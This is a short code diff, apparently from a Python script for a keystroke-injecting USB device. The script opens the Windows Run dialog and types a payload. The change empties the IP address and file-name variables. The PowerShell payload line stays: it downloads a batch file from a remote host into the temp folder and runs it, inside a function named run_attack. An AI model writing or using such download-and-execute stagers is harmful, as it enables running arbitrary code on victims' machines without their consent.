@@ -37,8 +37,8 @@ def win_r():
     kbd.send(Keycode.GUI, Keycode.R)
 
 
-ip = "192.168.18.32:8080"
-arq = "r.bat"
+ip = ""
+arq = ""
 payload = f'powershell -c "iwr http://{ip}/{arq} -OutFile $env:TMP\\{arq}; saps $env:TMP\\{arq};"'
 
 def run_attack():     
